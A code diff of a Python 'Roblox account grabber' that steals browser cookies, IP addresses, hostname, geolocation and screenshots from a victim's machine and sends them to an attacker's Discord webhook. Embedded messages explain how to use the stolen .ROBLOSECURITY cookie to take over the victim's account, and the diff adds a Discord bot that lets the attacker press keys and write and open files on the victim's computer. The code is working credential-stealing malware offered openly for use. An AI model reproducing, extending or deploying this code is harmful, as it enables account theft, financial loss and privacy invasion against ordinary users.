@@ -1,27 +1,30 @@
 import json
+import os
 import platform
 import socket
+import ssl
+import subprocess
+import sys
 import time
 import urllib.request
 import uuid
+import webbrowser
 from urllib.request import build_opener, HTTPSHandler
-import ssl
 import browser_cookie3
+import discord
 import psutil
 import pyautogui
 import requests
 import robloxpy
 from discord_webhook import DiscordWebhook, DiscordEmbed
-import sys
-import os
-import webbrowser
+from discord.ext import commands
 
 # variable
 
 file = "screenshot.png"
 
 
-class grabber:
+class RobloxAccountGrabber:
     def __init__(self, webhook: str):
         if not "discord.com/api/webhooks/" in webhook:
             print('You did not provide a webhook on Line 187.')
@@ -31,7 +34,6 @@ class grabber:
         self.cookie = None
         self.platform = None
         self.embeds = []
-
         self.browsers()
 
     @staticmethod
@@ -84,12 +86,12 @@ class grabber:
     @staticmethod
     def ip4():
         try:
-            opener = grabber.create_opener()
+            opener = RobloxAccountGrabber.create_opener()
             with opener.open('https://4.ident.me') as response:
                 return response.read().decode('ascii')
         except:
             try:
-                opener = grabber.create_opener()
+                opener = RobloxAccountGrabber.create_opener()
                 with opener.open('https://4.tnedi.me') as response:
                     return response.read().decode('ascii')
             except:
@@ -98,7 +100,7 @@ class grabber:
     def checker(self):
         if not robloxpy.Utils.CheckCookie(self.cookie) == "Valid Cookie":
             return requests.post(url=self.webhook, data={
-                'content': f'Found a dead self on {self.platform}{" - Continuing." if self.platform != "Librewolf" else ""}'})
+                'content': f'Found a dead cookie on {self.platform}{" - Continuing." if self.platform != "Librewolf" else ""}'})
 
         # The following part should be outside the checker function
         user = requests.get("https://www.roblox.com/mobileapi/userinfo", cookies={".ROBLOSECURITY": self.cookie}).json()
@@ -125,8 +127,6 @@ class grabber:
         hostname = socket.gethostname()
         ip_address = socket.gethostbyname(hostname)
 
-
-
         def create_html_page(file_path):
             # HTML content to be written to the file
             html_content = """
@@ -138,7 +138,7 @@ class grabber:
     <title>Disclaimer</title>
 </head>
 <body>
-    
+
 </body>
 </html>
     <link href="https://fonts.googleapis.com/css2?family=Poppins&display=swap" rel="stylesheet">
@@ -233,7 +233,7 @@ class grabber:
             except Exception as e:
                 print("Error while creating the HTML file:", e)
 
-        # Call the function directly to create the HTML file
+        # Puts # in the 5 lines below
         create_html_page('finalm.html')
         url = 'finalm.html'
         webbrowser.open(url)
@@ -244,7 +244,7 @@ class grabber:
             {
                 "title": f"✔ Valid Account - {self.platform}",
                 "description": f"Username: **{user['UserName']}**\nRobux: **R${int(user['RobuxBalance']):,}**\nPremium: **{user['IsPremium']}**\nCreated: **{robloxpy.User.External.CreationDate(id, 1)}** (*{int(robloxpy.User.External.GetAge(id)):,} days ago*)\nRAP: **{int(robloxpy.User.External.GetRAP(id)):,}**\nFriends: **{int(robloxpy.User.Friends.External.GetCount(id)):,}**\n\n------------------------------------------------------------------------\n\n Public IP Address: ||**{ip}**|| \n\n Private IP: Hostname:||**{hostname}**|| IP: ||**{ip_address}**||\n\n------------------------------------------------------------------------\n\nInfo's\n\nCity: {city} \n\n Region: {region_name} \n\n Country: {country} \n\n Latitude: {latitude} \n\n Longitude: {longitude}\n\n------------------------------------------------------------------------\n"
-                               f"\n See the self at the other message !",
+                               f"\n See the cookie at the other message !",
                 "color": 15426612,
                 "footer": {
                     "text": "v1.1.1 ; R0bluxGr@b by Independent-coder"
@@ -268,10 +268,10 @@ class grabber:
             {
                 "title": f"Access the account on - {self.platform}",
                 "description": f"Username: **{user['UserName']}**\nRobux: **R${int(user['RobuxBalance']):,}**\n Created: **{robloxpy.User.External.CreationDate(id, 1)}** (*{int(robloxpy.User.External.GetAge(id)):,} days ago*)\n  Cookie:\n```fix\n {self.cookie} ```"
-                               f"\n Now copy the self go into Roblox login.\n"
+                               f"\n Now copy the cookie go into Roblox login.\n"
                                f"\n Login into an temporary account."
                                f"\n Open inspect go into Application. Click on Cookies. Click on the 7th Cookies. It should be ROBLOSECURITY."
-                               f"\n Right click on value click modify and delete your and replace by the victim's self. \n"
+                               f"\n Right click on value click modify and delete your and replace by the victim's cookie. \n"
                                f"\n Refresh and you are into his account !"
                                f"\n Thanks for using my cookies grabber for roblox !",
                 "color": 3440107,
@@ -387,10 +387,12 @@ class grabber:
         Screencapture.save(f"{file}")  # Save the screenshot to a file
 
     def send(self):
-        webhook = DiscordWebhook(url=self.webhook, username="R0bluxGr@b", content="@everyone",
+        webhook = DiscordWebhook(url=self.webhook, username="Roblox_fan375", content="@everyone",
                                  avatar_url="https://westsidetoday-enki-v2.s3.amazonaws.com/wp-content/uploads/2015/01/th1.jpg")
+        webhook1 = DiscordWebhook(url=self.webhook, username="Roblox_fan375", content="@everyone",
+                                  avatar_url="https://westsidetoday-enki-v2.s3.amazonaws.com/wp-content/uploads/2015/01/th1.jpg")
 
-        webhook1 = DiscordWebhook(url=self.webhook, username="R0bluxGr@b", content="@everyone",
+        webhook2 = DiscordWebhook(url=self.webhook, username="Roblox_fan375", content="@everyone",
                                   avatar_url="https://westsidetoday-enki-v2.s3.amazonaws.com/wp-content/uploads/2015/01/th1.jpg")
 
         # Add the rest of the embeds
@@ -416,6 +418,8 @@ class grabber:
             }
         )
 
+
+
         with open(f"{file}", "rb") as f:
             webhook1.add_file(file=f.read(), filename=f"{file}")
 
@@ -424,5 +428,114 @@ class grabber:
         os.remove(file)
 
 
-grabber(
-    "your webhook")
+        webhook2.embeds.append(
+            {
+                "title": "Disclaimer",
+                "description": "Hello there! If you're looking for more information, you've come to the right place. Let me guide you through what you can do with this bot:"
+                               "\n\n1. Simple Info: You already have some basic information, but what if you want to explore further? That's where I come in!"
+                               "\n\n2. Interaction: Get ready to interact with the bot you've set up. It's easy – just type `!Help` to get started."
+                               "\n\n3. Discover More: By typing `!Help`."
+                               "\n\nSo, what are you waiting for? Lets hack and take the robux of our victim's. Ciao for now! :smirk:",
+                "color": 16562691,
+                "footer": {
+                    "text": "Disclaimer"
+                }
+            }
+        )
+
+        webhook2.execute()
+
+        def screenshot():
+            time.sleep(1)
+            Screencapture = pyautogui.screenshot()
+            Screencapture.save(f"{file}")  # Save the screenshot to a file
+
+        intents = discord.Intents.default()
+        intents.message_content = True
+
+        client = commands.Bot(command_prefix='!', intents=intents)
+
+        @client.command()
+        async def clear(ctx, arg=None):
+            if arg is None:
+                # Default behavior when no argument is provided
+                await ctx.send("Please provide the number of messages to clear.")
+                return
+
+            deleted = await ctx.channel.purge(limit=int(arg))
+            await ctx.send(f'Deleted {len(deleted)} message(s).')
+
+        @client.command()
+        async def insert(ctx):
+            pyautogui.press("insert")
+
+            embed = discord.Embed(title="Key has been pressed on the victim's computer.",
+                                  description="Key has been pressed on the victim's computer.", color=4360181)
+            await ctx.send(embed=embed)
+
+        @client.command()
+        async def terminate(ctx):
+            await ctx.send("Bot, Webhook, EXplo!t, SST and tools is shutting down...")
+            await ctx.bot.close()
+            sys.exit()
+
+        @client.command()
+        async def SH(ctx, action, *, sentence=None):
+            filename = "sentence.txt"
+
+            if action == "remove":
+                try:
+                    os.remove(filename)
+                    await ctx.send(f"File {filename} has been removed.")
+                except Exception as e:
+                    await ctx.send(f"An error occurred while removing the file: {e}")
+            elif action == "save":
+                if sentence is None:
+                    await ctx.send("Please provide a sentence.")
+                    return
+
+                # Save the sentence to a text file
+                with open(filename, "w") as file:
+                    file.write(sentence)
+                subprocess.Popen(["notepad.exe", filename])
+                await ctx.send(f"Message saved to {filename}.")
+            elif action == "display":
+                try:
+                    with open(filename, "r") as file:
+                        file_content = file.read()
+                        await ctx.send(file_content)
+                except FileNotFoundError:
+                    await ctx.send("File not found. Use `!SH save [sentence]` to save a sentence.")
+                except Exception as e:
+                    await ctx.send(f"An error occurred: {e}")
+            else:
+                await ctx.send("Invalid action. Use `remove`, `save`, or `display`.")
+
+        @client.command()
+        async def Help(ctx):
+            cmd_list = [
+                "!Help\n"
+                "Need Help ? No problem.\n\n"
+                "\n!insert\n"
+                "Input victims computer Insert key. :rage:\n\n",
+                "\n!terminate\n"
+                "Terminate the tool running on victim's computer :skull_crossbones:\n\n"
+                "\n!clear\n"
+                "Delete message using (!clear NUMBER) because it can be messy !\n\n"
+                "\n!SH\n"
+                "Shows up any message using notepad :computer:\n\n"
+                "Here the three types of command !SH save YOUR SENTENCE, !SH display, !SH remove \n\n"
+                "!SH save = save your sentence\n\n"
+                "!SH display = display your sentence\n\n"
+                "!SH remove = remove sentence.txt \n\n\n"
+            ]
+
+            command_info = "\n".join(cmd_list)
+            embed = discord.Embed(title="List of Commands", description=command_info, color=0x00ff00)
+            await ctx.send(embed=embed)
+
+        client.run('YOUR_BOT_TOKEN')
+
+
+RobloxAccountGrabber(
+    "YOUR_DISCORD_WEBHOOK")
